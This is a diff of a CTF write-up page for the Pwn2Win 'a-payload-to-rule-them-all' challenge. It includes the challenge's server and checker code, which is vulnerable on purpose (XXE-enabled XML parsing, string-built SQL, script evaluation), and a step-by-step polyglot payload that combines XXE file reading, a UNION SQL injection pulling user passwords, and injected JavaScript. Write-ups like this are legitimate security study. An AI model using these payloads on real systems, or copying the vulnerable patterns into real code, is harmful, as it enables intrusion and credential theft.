@@ -7,23 +7,26 @@
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
 	<meta name="theme-color" content="#494f5c">
 	<meta name="msapplication-TileColor" content="#494f5c">
-<meta itemprop="name" content="A Payload to Rule Them All">
-<meta itemprop="description" content="a-payload-to-rule-them-all This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server.">
-<meta itemprop="datePublished" content="2020-06-08T23:25:58-04:00" />
-<meta itemprop="dateModified" content="2020-06-08T23:25:58-04:00" />
-<meta itemprop="wordCount" content="29">
+<meta itemprop="name" content="a-payload-to-rule-them-all">
+<meta itemprop="description" content="This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server.
+const express = require(&#34;express&#34;) const app = express() const bodyParser = require(&#34;body-parser&#34;) const port = 31337 const { execFile } = require(&#34;child_process&#34;) const fs = require(&#34;fs&#34;) const rateLimit = require(&#34;express-rate-limit&#34;); app.use(express.static(&#34;static&#34;)) app.use(bodyParser.urlencoded({ extended: true })) const limiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 50 }); // 15 minutes // limit each IP to 100 requests per windowMs app.">
+<meta itemprop="datePublished" content="2020-06-08T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-06-08T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="675">
 
 
 
-<meta itemprop="keywords" content="web," /><meta property="og:title" content="A Payload to Rule Them All" />
-<meta property="og:description" content="a-payload-to-rule-them-all This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server." />
+<meta itemprop="keywords" content="web," /><meta property="og:title" content="a-payload-to-rule-them-all" />
+<meta property="og:description" content="This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server.
+const express = require(&#34;express&#34;) const app = express() const bodyParser = require(&#34;body-parser&#34;) const port = 31337 const { execFile } = require(&#34;child_process&#34;) const fs = require(&#34;fs&#34;) const rateLimit = require(&#34;express-rate-limit&#34;); app.use(express.static(&#34;static&#34;)) app.use(bodyParser.urlencoded({ extended: true })) const limiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 50 }); // 15 minutes // limit each IP to 100 requests per windowMs app." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://freeeve.github.io/ctf-writeups/posts/2020/pwn2win/a-payload-to-rule-them-all/" />
-<meta property="article:published_time" content="2020-06-08T23:25:58-04:00" />
-<meta property="article:modified_time" content="2020-06-08T23:25:58-04:00" />
+<meta property="article:published_time" content="2020-06-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-08T00:00:00+00:00" />
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="A Payload to Rule Them All"/>
-<meta name="twitter:description" content="a-payload-to-rule-them-all This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server."/>
+<meta name="twitter:title" content="a-payload-to-rule-them-all"/>
+<meta name="twitter:description" content="This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server.
+const express = require(&#34;express&#34;) const app = express() const bodyParser = require(&#34;body-parser&#34;) const port = 31337 const { execFile } = require(&#34;child_process&#34;) const fs = require(&#34;fs&#34;) const rateLimit = require(&#34;express-rate-limit&#34;); app.use(express.static(&#34;static&#34;)) app.use(bodyParser.urlencoded({ extended: true })) const limiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 50 }); // 15 minutes // limit each IP to 100 requests per windowMs app."/>
 
 	<link rel="apple-touch-icon" sizes="180x180" href="/ctf-writeups/apple-touch-icon.png">
 	<link rel="icon" type="image/png" sizes="32x32" href="/ctf-writeups/favicon-32x32.png">
@@ -32,7 +35,7 @@
 	<link rel="mask-icon" href="/ctf-writeups/safari-pinned-tab.svg" color="">
 	<link rel="shortcut icon" href="/ctf-writeups/favicon.ico">
 
-	<title>A Payload to Rule Them All</title>
+	<title>a-payload-to-rule-them-all</title>
 	<link rel="stylesheet" href="https://freeeve.github.io/ctf-writeups/css/style.min.5234f1d9dc6c62eab1dcf3da70f9af9735f93727c44414616bebe3632a4b8741.css" integrity="sha256-UjTx2dxsYuqx3PPacPmvlzX5NyfERBRha+vjYypLh0E=" crossorigin="anonymous">
 	
 </head>
@@ -66,23 +69,155 @@
 	<main class="site-main section-inner animated fadeIn faster">
 		<article class="thin">
 			<header class="post-header">
-				<div class="post-meta"><span>Jun 8, 2020</span></div>
-				<h1>A Payload to Rule Them All</h1>
+				<div class="post-meta"><span>2020-06-08</span></div>
+				<h1>a-payload-to-rule-them-all</h1>
 			</header>
 			<div class="content">
-				<h1 id="a-payload-to-rule-them-all">a-payload-to-rule-them-all<a href="#a-payload-to-rule-them-all" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
-<p>This one gives us a post endpoint for a payload that needs to exploit xxe, xss,
+				<p>This one gives us a post endpoint for a payload that needs to exploit xxe, xss,
 and sqli (sql injection), as well as the code for the server.</p>
-<div class="highlight"><pre class="chroma"><code class="language-server.js" data-lang="server.js"> 
-</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-server.js" data-lang="server.js"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;body-parser&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">rateLimit</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express-rate-limit&#34;</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s2">&#34;static&#34;</span><span class="p">))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}))</span>
+<span class="kr">const</span> <span class="nx">limiter</span> <span class="o">=</span> <span class="nx">rateLimit</span><span class="p">({</span> <span class="nx">windowMs</span><span class="o">:</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span> <span class="nx">max</span><span class="o">:</span> <span class="mi">50</span> <span class="p">});</span>
+<span class="c1">// 15 minutes  // limit each IP to 100 requests per windowMs 
+</span><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">limiter</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="nx">test_payload</span> <span class="o">=</span> <span class="nx">execFile</span><span class="p">(</span><span class="s2">&#34;/usr/sbin/gosu&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;gnx&#34;</span><span class="p">,</span> <span class="s2">&#34;/home/gnx/script/test_payload.js&#34;</span><span class="p">,</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">payload</span><span class="p">],</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">trim</span><span class="p">()</span> <span class="o">===</span> <span class="s2">&#34;parabens hackudo&#34;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">)</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
+                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;nope&#34;</span><span class="p">)</span> 
+            <span class="p">}</span>
+        <span class="p">});</span> 
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">payload</span><span class="p">)</span>
+<span class="p">})</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/source&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="s2">&#34;/usr/src/app/index.js :\n\n&#34;</span> <span class="o">+</span>
+        <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&#34;/usr/src/app/index.js&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span>
+        <span class="s2">&#34;\n\n&#34;</span>
+    <span class="nx">out</span> <span class="o">+=</span> <span class="s2">&#34;/home/gnx/script/test_payload.js :\n\n&#34;</span> <span class="o">+</span>
+        <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&#34;/home/gnx/script/test_payload.js&#34;</span><span class="p">)</span> <span class="o">+</span>
+        <span class="s2">&#34;\n\n&#34;</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Chall rodando em http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">))</span>
+</code></pre></div><p>as well as the <code>test_payload.js</code> referenced above:</p>
+<div class="highlight"><pre class="chroma"><code class="language-test_payload.js" data-lang="test_payload.js"><span class="ch">#!/usr/bin /env node
+</span><span class="ch"></span><span class="kr">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;mysql&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">util</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;util&#39;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">libxml</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;libxmljs&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">sanitizeHtml</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;sanitize-html&#34;</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">test_xxe</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">my_secret</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s2">&#34;/home/gnx/script/xxe_secret&#34;</span><span class="p">,</span> <span class="nx">my_secret</span><span class="p">)</span>
+        <span class="kd">var</span> <span class="nx">doc</span> <span class="o">=</span> <span class="nx">libxml</span><span class="p">.</span><span class="nx">parseXml</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="p">{</span> <span class="nx">noent</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">nonet</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
+        <span class="k">return</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="nx">my_secret</span><span class="p">)</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">false</span> <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">test_xss</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
+            <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;--no-sandbox&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-setuid-sandbox&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-dev-shm-usage&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-accelerated-2d-canvas&#39;</span><span class="p">,</span> <span class="s1">&#39;--no-first-run&#39;</span><span class="p">,</span> <span class="s1">&#39;--no-zygote&#39;</span><span class="p">,</span> <span class="s1">&#39;--single-process&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-gpu&#39;</span><span class="p">]</span>
+        <span class="p">})</span>
+        <span class="kr">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">()</span>
+        <span class="nx">page</span><span class="p">.</span><span class="nx">setDefaultNavigationTimeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+        <span class="nx">payload</span> <span class="o">=</span> <span class="nx">sanitizeHtml</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="p">{</span> <span class="nx">allowedTags</span><span class="o">:</span> <span class="p">[]</span> <span class="p">})</span>
+        <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="sb">`data:text/html,&lt;script&gt;</span><span class="si">${</span><span class="nx">payload</span><span class="si">}</span><span class="sb">&lt;/script&gt;`</span><span class="p">)</span>
+        <span class="kr">const</span> <span class="nx">check</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="s2">&#34;( typeof xss != &#39;undefined&#39; ? true : false )&#34;</span><span class="p">)</span>
+        <span class="c1">// vlw herrera
+</span><span class="c1"></span>        <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nx">check</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">test_sqli</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
+        <span class="nx">host</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_HOST</span> <span class="o">||</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
+        <span class="nx">user</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_USER</span><span class="p">,</span>
+        <span class="nx">password</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_PASSWORD</span><span class="p">,</span>
+        <span class="nx">database</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_DATABASE</span><span class="p">,</span>
+        <span class="nx">charset</span><span class="o">:</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
+        <span class="nx">dialectOptions</span><span class="o">:</span> <span class="p">{</span> <span class="nx">collate</span><span class="o">:</span> <span class="s1">&#39;utf8_general_ci&#39;</span><span class="p">,</span> <span class="p">},</span>
+    <span class="p">})</span>
+    <span class="kr">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">promisify</span><span class="p">(</span><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="nx">connection</span><span class="p">)</span>
+    <span class="nx">connection</span><span class="p">.</span><span class="nx">connect</span><span class="p">()</span>
+    <span class="kr">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;SELECT * from users&#34;</span><span class="p">)</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">sqli</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="sb">`SELECT * from posts where id=&#39;</span><span class="si">${</span><span class="nx">payload</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">)</span>
+        <span class="nx">await</span> <span class="nx">connection</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">sqli</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;password&#34;</span><span class="p">])</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xss</span> <span class="o">=</span> <span class="nx">test_xss</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="kd">var</span> <span class="nx">sqli</span> <span class="o">=</span> <span class="nx">test_sqli</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="kd">var</span> <span class="nx">xxe</span> <span class="o">=</span> <span class="nx">test_xxe</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span><span class="nx">xss</span><span class="p">,</span> <span class="nx">sqli</span><span class="p">]).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">values</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">values</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">xxe</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;parabens hackudo&#34;</span><span class="p">)</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;hack harder&#34;</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="p">})</span>
+<span class="p">}</span>
+<span class="nx">main</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+</code></pre></div><p>I realized I&rsquo;d need something that parsed as valid js, valid sqli, and valid
+xml, to some extent, which was the hardest part of the puzzle.</p>
+<p>The xml attack was pretty easy to test locally and pretty easy to come up with.
+As simple as this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
+</code></pre></div><p>Next, getting some validly parsing sql by ending the quote, and tacking
+a comment on the end with <code>#</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
+<span class="c">&lt;!--&#39; union select password from users limit 1;#--&gt;</span>
+</code></pre></div><p>It was a bit of a struggle to get the js to work (need to inject <code>xss=true;</code>), even with the assist of
+sanitize-html. The sanitize-html call basically stripped out all of the xml
+and comments, which was mostly helpful, so something like this almost works:</p>
+<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;&lt;r&gt;;xss=true;//&amp;xxe;&lt;/r&gt;
+&lt;!--' union select password from users limit 1;#--&gt;
+</code></pre><p>But you end up with something like: <code>]&gt;;xss=true;//&amp;xxe;</code> and the <code>];</code> doesn&rsquo;t
+run.</p>
+<p>I spent a while struggling with this piece, until a teammate suggested trying
+another entity to inject a comment around the garbage:</p>
+<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;
+&lt;!ENTITY xxe2 SYSTEM &quot;xxe_seed&gt;/*&quot;&gt;]&gt;&lt;r&gt;*/xss=true;//&amp;xxe;&lt;/r&gt;
+&lt;!--' union select password from users;#--&gt;
+</code></pre><p>And the last piece was figuring out how many columns was in the posts table, so
+we could match the union injection&ndash;took a few tries, but I just tacked on <code>,1</code>
+until it ran and gave the flag. I think it was 4 columns, but don&rsquo;t remember at
+this point. The <code>limit 1</code> isn&rsquo;t necessary but it seemed kind not to pull in the whole
+table cartesian product ;) &ndash;the result was something like this:</p>
+<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;
+&lt;!ENTITY xxe2 SYSTEM &quot;xxe_seed&gt;/*&quot;&gt;]&gt;&lt;r&gt;*/xss=true;//&amp;xxe;&lt;/r&gt;
+&lt;!--' union select password, 1, 1, 1 from users limit 1;#--&gt;
+</code></pre>
 			</div>
 			<hr class="post-end">
 			<footer class="post-info">
 				<p>
 					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://freeeve.github.io/ctf-writeups/tags/web">web</a></span>
 				</p>
-				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>29 Words</p>
-				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-08 23:25 -0400</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>675 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-07</p>
 			</footer>
 		</article>
 		<div class="post-nav thin">
